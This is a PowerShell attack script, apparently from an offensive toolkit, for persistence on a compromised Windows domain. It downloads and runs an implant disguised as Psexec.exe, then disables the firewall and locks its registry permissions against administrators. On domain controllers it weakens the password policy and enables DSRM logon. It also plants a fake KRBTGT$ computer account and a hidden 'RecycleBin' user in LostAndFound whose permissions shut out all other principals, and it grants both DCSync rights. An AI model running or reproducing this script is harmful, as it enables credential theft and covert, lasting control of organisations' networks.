# Install IMIX
$progresspreference="SilentlyContinue"
Invoke-WebRequest -Uri {imix} -OutFile .\Psexec.exe;.\Psexec.exe install; del .\Psexec.exe

# Disable Firewall and Firewall access
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
$path = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
$fwacl = Get-Acl $path
$fwacl.SetAccessRuleProtection($true, $false)
$fwacl.Access | ForEach-Object { $fwacl.RemoveAccessRule($_) }
$fc = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "FullControl", "Deny")
$do = New-Object System.Security.AccessControl.RegistryAccessRule("OWNER RIGHTS","ChangePermissions,TakeOwnership","Deny")
$fwacl.AddAccessRule($fc)
$fwacl.AddAccessRule($do)
Set-Acl $path $fwacl

if ((Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS" -ErrorAction SilentlyContinue).ObjectName) {
    Import-Module ActiveDirectory

    $DN = (Get-ADDomain).DistinguishedName
    $Domain = (Get-ADDomain).DNSRoot

    # Make DC Shit
    Get-ADUser -Filter { SamAccountName -notlike "*$" } | Set-ADUser -AllowReversiblePasswordEncryption $true 
    Set-ADDefaultDomainPasswordPolicy -Identity $DN -ReversibleEncryptionEnabled $true 
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LMCompatibilityLevel" -Value 0 -Type DWord
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "OldPasswordAllowedPeriod" -Value 7200 -Type DWord
    Set-ADDefaultDomainPasswordPolicy -Identity $DN -MinPasswordLength 1 -PasswordHistoryCount 0 -ComplexityEnabled $false -MaxPasswordAge "999.00:00:00" -MinPasswordAge "0.00:00:00" -LockoutThreshold 0

    # Enable backup admin
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2

    # Add computer account
    New-ADComputer -Name KRBTGT -AccountPassword (ConvertTo-SecureString "NewPass123" -AsPlainText -Force) -Enabled $true
    net localgroup "Remote Management Users" /add KRBTGT$

    $dn  = (Get-ADDomain).DistinguishedName
    $acl = Get-Acl "AD:$dn"
    $acct = New-Object System.Security.Principal.NTAccount "KRBTGT$"

    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' | ForEach-Object {
        $acl.AddAccessRule(
            [System.DirectoryServices.ActiveDirectoryAccessRule]::new(
                $acct,
                [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                [System.Security.AccessControl.AccessControlType]::Allow,
                [guid]$_
            )
        )
    }

    Set-Acl "AD:$dn" $acl



    # Add invisible account in LostAndFound

    $BackdoorAccountName = "RecycleBin"

    $domainDN = (Get-ADDomain | Select-Object -Property DistinguishedName).DistinguishedName
    $DomainAdminsSid = New-Object System.Security.Principal.SecurityIdentifier ((Get-ADGroup "Domain Admins").SID.Value)
    $DomainAdminsIdentity = [System.Security.Principal.IdentityReference] ($DomainAdminsSid)

    $splat = @{
        Name = $BackdoorAccountName
        AccountPassword = (ConvertTo-SecureString 'NewPass123' -AsPlainText -Force)
        Enabled = $true
        CannotChangePassword = $true
        ChangePasswordAtLogon = $false
        PasswordNeverExpires = $true
        Path = "CN=LostAndFound," + $domainDN
    }
    New-ADUser @splat

    $user = (Get-ADUser $BackdoorAccountName)

    $userSid = New-Object System.Security.Principal.SecurityIdentifier $user.SID.Value
    $UserIdentity = [System.Security.Principal.IdentityReference] ($userSid)

    $SR=New-Object DirectoryServices.DirectoryEntry("LDAP://CN=" + $BackdoorAccountName + ",CN=LostAndFound," + $domainDN)
    $searcher=New-Object DirectoryServices.DirectorySearcher($SR)
    $searcher.SearchScope = "Base"
    $result=$searcher.findone()

    $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
    $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
    $NewGUID = New-Object Guid "00000000-0000-0000-0000-000000000000"
    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'

    $ACEs = @()

    $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UserIdentity, $ADRights, $ControlType, $NewGUID, $InheritanceType

    # Uncomment to Retain Domain Admins access to hidden user
    #$ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $DomainAdminsIdentity, $ADRights, $ControlType, $NewGUID, $InheritanceType

    $TargetEntry = $result.GetDirectoryEntry()

    $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
    $TargetEntry.PsBase.ObjectSecurity.SetOwner($UserIdentity)

    $TargetEntry.PsBase.ObjectSecurity.SetAccessRuleProtection($true, $false)

    $CurrentIdentities = $TargetEntry.PsBase.ObjectSecurity.Access | Select-Object IdentityReference

    ForEach ($PersonIdentity in $CurrentIdentities) {
        $TargetEntry.PsBase.ObjectSecurity.PurgeAccessRules($PersonIdentity.IdentityReference)
    }

    ForEach ($ACE in $ACEs) {
        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
    }

    $TargetEntry.PsBase.CommitChanges()

    # Give the user DCSync
    $dn  = (Get-ADDomain).DistinguishedName
    $acl = Get-Acl "AD:$dn"
    $acct = New-Object System.Security.Principal.NTAccount $BackdoorAccountName

    '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' | ForEach-Object {
        $acl.AddAccessRule(
            [System.DirectoryServices.ActiveDirectoryAccessRule]::new(
                $acct,
                [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                [System.Security.AccessControl.AccessControlType]::Allow,
                [guid]$_
            )
        )
    }

    Set-Acl "AD:$dn" $acl
}

